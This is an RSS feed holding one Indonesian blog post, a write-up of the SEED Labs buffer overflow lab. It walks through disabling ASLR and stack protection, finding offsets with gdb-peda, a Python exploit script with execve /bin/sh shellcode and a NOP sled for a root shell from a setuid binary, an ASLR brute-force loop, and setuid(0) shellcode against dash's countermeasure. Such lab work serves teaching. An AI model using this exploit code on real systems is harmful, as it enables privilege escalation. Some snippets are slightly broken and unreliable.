<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Hello World. I am Dito Prabowo</title>
        <link>/posts/</link>
        <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Fri, 11 Oct 2019 20:25:58 +0700</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Buffer_Overflow_Labs_From_SEEDlabs</title>
            <link>/posts/buffer_overflow_labs_from_seedlabs/</link>
            <pubDate>Fri, 11 Oct 2019 20:25:58 +0700</pubDate>
            
            <guid>/posts/buffer_overflow_labs_from_seedlabs/</guid>
            <description>0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</description>
            <content type="html"><![CDATA[

<h2 id="0x00-intro">0x00 Intro</h2>

<p>Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.</p>

<h2 id="0x01-guide">0x01 Guide</h2>

<p>Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</p>

<p>Untuk file yang dibutuhkan :</p>

<ol>
<li><p>stack.c (the vulnerable program)</p></li>

<li><p>call_shellcode.c</p></li>

<li><p>Exploit.py (Buat Sendiri)</p></li>
</ol>

<p>Untuk file stack.c dan call_shellcode.c sudah disediakan oleh seedlab, untuk exploit.py saya membuat sendiri payloadnya yang untuk injeksi.</p>

<p>Kita bisa memasukan shellcode kedalam badfile tapi program belum bisa mengeksekusi shellcode karena return address program belum kita overflow dan diarahkan ke lokasi alamat shelccode, untuk itu kita harus menyari return address program, dan menggantinya dengan alamat shellcode.</p>

<p>Untuk mencari return address bisa mudah kita cari menggunakan feature gdb-peda yaitu pattern, saat program kita jalankan kasih pattern yang sudah di generate, akan muncul invalid return address suatu alamat, lalu alamat itu akan di baca oleh gdb-peda dan akan menghasilkan angka berapa ofset yang harus kita isi padding(junk char) agar kita bisa memodifikasi return address.</p>

<p>Untuk mencari alamat shellcode, debug program dengan gdb-peda lalu break pada salah satu address saat variable buffer terbuat, lalu bisa kita baca alamat buffer tersebut.</p>

<p>Ketika sudah mendapat return address dan alamat shellcode, kita buat payload dan memasukannya kedalam badfile, setelah itu kita jalankan programnya stack. Apabila berhasil masuk ke dalam shell berarti buffer overflow berhasil.</p>

<p>Adapun step step yang harus kita lakukan :</p>

<ol>
<li><p>Mematikan Address Space Randomization pada VM.</p></li>

<li><p>Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</p></li>

<li><p>Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</p></li>

<li><p>Mencari offset untuk return address</p></li>

<li><p>Mencari alamat Buffer</p></li>

<li><p>Membuat Payload dan mengeksekusi</p></li>
</ol>

<h2 id="0x02-lab">0x02 LAB</h2>

<h3 id="task-1-exploiting-the-vulnerability">TASK 1 : Exploiting the Vulnerability</h3>

<h4 id="1-mematikan-address-space-randomization-pada-vm">1.Mematikan Address Space Randomization pada VM.</h4>

<p>Mematikan ASLR dapat kita lakukan dengan command :</p>

<pre><code>sudo sysctl -w kernel.randomize_va_space=0
</code></pre>

<p>Apabila kita tidak mematikan ASLR alamat alamat pada program akan berubah berubah dan kita akan agak kesulitan untuk melakukan buffer overflow</p>

<h4 id="2-mengcompile-file-stack-c-dengan-mematikan-stackguard-protection-scheme-dan-membuat-shellcode-di-stack-dapat-di-eksekusi-execstack">2.Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</h4>

<p>Secara default compiler gcc saat mengcompile menyalakan StackGuard Protection Scheme untuk mencegah user memasukan input lebih dari yang di definisikan, misal buffer[10] apabila kita memasukan lebih dari 10 character akan terdeteksi stack smasing.</p>

<pre><code>*** stack smashing detected : ./stack terminated
</code></pre>

<p>Selain itu, agar shellcode bisa berjalan perlu -z execstack agar shellcode di stack dapat di eksekusi.</p>

<p>Untuk command nya</p>

<pre><code>gcc -o stack -z execstack -fno-stack-protector stack.c
chmod 4755 stack
</code></pre>

<h4 id="3-mencoba-dan-memastikan-dapat-mengeksekusi-shellcode-dengan-file-call-shellcode-c">3. Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</h4>

<p>Compile call_shellcode.c dengan menggunakan perintah :</p>

<pre><code>gcc -z execstack -o call_shellcode call_shellcode.c
</code></pre>

<p>Setelah berhasil lalu jalankan program</p>

<pre><code>./call_shellcode
</code></pre>

<p>Hasilnya :</p>

<p><img src="/img/call_shellcode.png" alt="call_shellcode"
     style="float: left;" />
<br><br><br><br></p>

<h4 id="4-mencari-offset-untuk-return-address">4. Mencari offset untuk return address</h4>

<p>Untuk mendebug program dalam linux bisa menggunakan gdb, namun untuk kasus binary exploitation akan lebih disarankan untuk menggunakan gdb-peda, karena mengandung beberapa feature tambahan untuk buffer overflow salah satunya yaitu pattern untuk mencari nilai offset return address.</p>

<p>pada terminal lakukan gdb pada program stack</p>

<pre><code>gdb -q stack
</code></pre>

<p>lalu buat pattern untuk mencari nilai offset return address</p>

<pre><code>pattern create 40
</code></pre>

<p><img src="/img/pattern.png" alt="pattern_create"
  style="float: left;" />
  <br><br></p>

<p>setelahnya buat file exploit.py dan masukan pattern ke dalam badfile</p>

<pre><code class="language-python">import sys

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))
content[0:40] = &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa&quot;

# Write the content to badfile
file = open(&quot;badfile&quot;, &quot;wb&quot;)
file.write(content)
file.close()
</code></pre>

<p>lalu jalankan(di terminal baru) dengan command  :</p>

<pre><code>python exploit.py
</code></pre>

<p>akan muncul file bernama badfile, kemudian pada terminal gdb-peda jalankan dengan command run</p>

<p>akan muncul invalid</p>

<p><img src="/img/invalid.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<p>nah kita bisa cari offset return addres nya dengan command pada gdb-peda :</p>

<pre><code>pattern offset 0x61414145
</code></pre>

<p>lalu akan muncul jumlah ofset yang perlu kita ketahui</p>

<p><img src="/img/offset.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<h4 id="5-mencari-alamat-buffer">5.Mencari alamat Buffer</h4>

<p>setelah kita tau offset nya, kita perlu mencari tau alamat buffer nya, masuk ke gdb-peda dan lihat code diassambly nya</p>

<pre><code>$ gdb -q stack
gdb-peda$ pdisass main
</code></pre>

<pre><code class="language-python">Dump of assembler code for function main:
   0x080484da &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x080484de &lt;+4&gt;:	and    esp,0xfffffff0
   0x080484e1 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x080484e4 &lt;+10&gt;:	push   ebp
   0x080484e5 &lt;+11&gt;:	mov    ebp,esp
   0x080484e7 &lt;+13&gt;:	push   ecx
   0x080484e8 &lt;+14&gt;:	sub    esp,0x214
   0x080484ee &lt;+20&gt;:	sub    esp,0x8
   0x080484f1 &lt;+23&gt;:	push   0x80485d0
   0x080484f6 &lt;+28&gt;:	push   0x80485d2
   0x080484fb &lt;+33&gt;:	call   0x80483a0 &lt;fopen@plt&gt;
   0x08048500 &lt;+38&gt;:	add    esp,0x10
   0x08048503 &lt;+41&gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x08048506 &lt;+44&gt;:	push   DWORD PTR [ebp-0xc]
   0x08048509 &lt;+47&gt;:	push   0x205
   0x0804850e &lt;+52&gt;:	push   0x1
   0x08048510 &lt;+54&gt;:	lea    eax,[ebp-0x211]
   0x08048516 &lt;+60&gt;:	push   eax
   0x08048517 &lt;+61&gt;:	call   0x8048360 &lt;fread@plt&gt;
   0x0804851c &lt;+66&gt;:	add    esp,0x10
   0x0804851f &lt;+69&gt;:	sub    esp,0xc
   0x08048522 &lt;+72&gt;:	lea    eax,[ebp-0x211]
   0x08048528 &lt;+78&gt;:	push   eax
   0x08048529 &lt;+79&gt;:	call   0x80484bb &lt;bof&gt;
   0x0804852e &lt;+84&gt;:	add    esp,0x10
   0x08048531 &lt;+87&gt;:	sub    esp,0xc
   0x08048534 &lt;+90&gt;:	push   0x80485da
   0x08048539 &lt;+95&gt;:	call   0x8048380 &lt;puts@plt&gt;
   0x0804853e &lt;+100&gt;:	add    esp,0x10
   0x08048541 &lt;+103&gt;:	mov    eax,0x1
   0x08048546 &lt;+108&gt;:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048549 &lt;+111&gt;:	leave  
   0x0804854a &lt;+112&gt;:	lea    esp,[ecx-0x4]
   0x0804854d &lt;+115&gt;:	ret    
End of assembler dump.
</code></pre>

<p>kita break saat memamnggil function bof</p>

<pre><code>gdb-peda$ b *main+79
Breakpoint 1 at 0x8048529
gdb-peda$ r
</code></pre>

<p>.*</p>

<p>pada stack terlihat alamat str mulai mengisi nilai
pada alamat tertentu yaitu</p>

<pre><code class="language-python">0xbfffea37
</code></pre>

<p><img src="/img/stack.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<p>berarti kita dapat menaruh return address mulai dari alamat diatas sampai 517-len(shelccode) dikarenakan kita akan menaruh shelccode pada akhir badfile, jadi ketika kita alihkan ke alamat diantara alamat diatas sampai 517-len(shelccode) kita pada akhirnya akan menemui shellcode dan dapat mengeksekusi nya karena selain shellcode isi badfile hanyalah 0x90(NOP) yg artinya tidak ada  operasi apa-apa.</p>

<p>kita buat saja return address nya</p>

<pre><code class="language-python">0xbfffea77
</code></pre>

<h4 id="6-membuat-payload-dan-mengeksekusi">6. Membuat Payload dan mengeksekusi</h4>

<p>payload =</p>

<pre><code class="language-python">import sys

shellcode= (
    &quot;\x31\xc0&quot;             # xorl    %eax,%eax              
    &quot;\x50&quot;                 # pushl   %eax                   
    &quot;\x68&quot;&quot;//sh&quot;           # pushl   $0x68732f2f            
    &quot;\x68&quot;&quot;/bin&quot;           # pushl   $0x6e69622f            
    &quot;\x89\xe3&quot;             # movl    %esp,%ebx              
    &quot;\x50&quot;                 # pushl   %eax                   
    &quot;\x53&quot;                 # pushl   %ebx                   
    &quot;\x89\xe1&quot;             # movl    %esp,%ecx              
    &quot;\x99&quot;                 # cdq                            
    &quot;\xb0\x0b&quot;             # movb    $0x0b,%al              
    &quot;\xcd\x80&quot;             # int     $0x80                  
).encode('latin-1')


offset = 36
content = bytearray(0x90 for i in range(517))
start = 517 - len(shellcode)
returna = (&quot;\x77\xea\xff\xbf&quot;).encode('latin-1')
content[0:1]=(&quot;\x41&quot;).encode('latin-1')
content[offset:offset+4] = returna
content[start:] = shellcode
file = open(&quot;badfile&quot;, &quot;wb&quot;)
file.write(content)
file.close()
</code></pre>

<p>pertama-tama seluruh content badfile akan diisi dengan NOP, lalu content pertama kita isi dengan 0x41 untuk mengetahui itu merupakan mulainya str,
kemudian di offset return addres kita isi dengan return address diatas agar masuk ke addres str(badfile), pada akhir ( 517 - len(shellcode)) kita tulis kan shelccode nya</p>

<p>lalu kita buat exploit nya dan menjalankan program stack nya</p>

<pre><code>python3 exploit.py
./StackGuard
</code></pre>

<p>jika berhasil akan mengarahkan kita ke shellcode</p>

<p><img src="/img/shell.png" alt="call_shellcode"
     style="float: left;" />
<br></p>

<p>Exploit berhasil kita lakukan</p>

<hr />

<h3 id="task-2-address-randomization">Task 2: Address Randomization</h3>

<p>pada task 2, kita menyalakan sistem aslr dalam linux dengan command</p>

<pre><code>  sudo sysctl -w kernel.randomize_va_space=2
</code></pre>

<p>lalu kita lakukan bruteforce sampai ketemu sesuai dengan alamat address nya,</p>

<pre><code>  sh -c &quot;while [ 1 ]; do ./stack; done;&quot;
</code></pre>

<p>kita lakukan loop sampai program bisa tereksekusi.</p>

<p>Bukti :</p>

<p><img src="/img/task2.png" alt="" /></p>

<p>Proses while mencari addres yg sesuai (Faktor Lucky,bisa sangat lama, bisa cepat, tapi kebanyakan lama, saya sendiri beberapa jam baru ketemu) :</p>

<p><img src="/img/prosestask2.png" alt="" /></p>

<p>Setelah mendapat shell (akhirnyaaaa) :
<img src="/img/hasiltask2.png" alt="" /></p>

<hr />

<h3 id="task-3-stack-guard">Task 3: Stack Guard</h3>

<p>Pada task ini kita mencoba untuk tidak mematikan stack guard protection yang mana akan menghalangi kita untuk melakukan buffer overflow,</p>

<p>Hasil :
<img src="/img/task3.png" alt="" /></p>

<hr />

<h3 id="task-4-non-executable-stack">Task 4: Non-executable Stack</h3>

<p>pada task kali ini kita menjalankan program dengan tidak mengijinkan isi stack dapat dieksekusi</p>

<pre><code>  gcc -o stack -z noexecstack -fno-stack-protector stack.c
</code></pre>

<p>perintah noexecstack membuat kita tidak bisa menjalankan shellcode yang ada di dalam Stack</p>

<p>Hasil :</p>

<p><img src="/img/task4.png" alt="" /></p>

<p>mendapatkan segmentation fault karena tidak bisa menjalankan payload dalam stack</p>

<hr />

<h3 id="task-5-defeating-dash-s-countermeasure">Task 5: Defeating dash&rsquo;s countermeasure</h3>

<p>Kita coba dulu program untuk mendapatkan shell</p>

<pre><code class="language-objective-c">// dash_shell_test.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
int main()
{
char *argv[2];
argv[0] = &quot;/bin/sh&quot;;
argv[1] = NULL;
// setuid(0); ➀
execve(&quot;/bin/sh&quot;, argv, NULL);
return 0;
}
</code></pre>

<p>**.</p>

<p>Maka akan mendapat kan root :
<img src="/img/t5.png" alt="" /></p>

<p>Tapi ketika kita setuid(0) kita aktifkan maka akan mendapat user seed:
<img src="/img/t51.png" alt="" /></p>

<p>Nah kita perlu memodifikasi shellcode agar kita bisa mendapatkan akses root, pada file exploit.py kita tambahkan shellcode berikut pada line diatasnya</p>

<pre><code class="language-python">har shellcode[] =
&quot;\x31\xc0&quot; /* Line 1: xorl %eax,%eax */
&quot;\x31\xdb&quot; /* Line 2: xorl %ebx,%ebx */
&quot;\xb0\xd5&quot; /* Line 3: movb $0xd5,%al */
&quot;\xcd\x80&quot; /* Line 4: int $0x80 */
</code></pre>

<p>akan mendapatkan root :
<img src="/img/t52.png" alt="" /></p>

<p>jika program diatas dijalankan pada program yang ada countermeasure dash nya maka kita yang semestinya akan mendapat shell user akan mendapat shell root.</p>
]]></content>
        </item>
        
    </channel>
</rss>
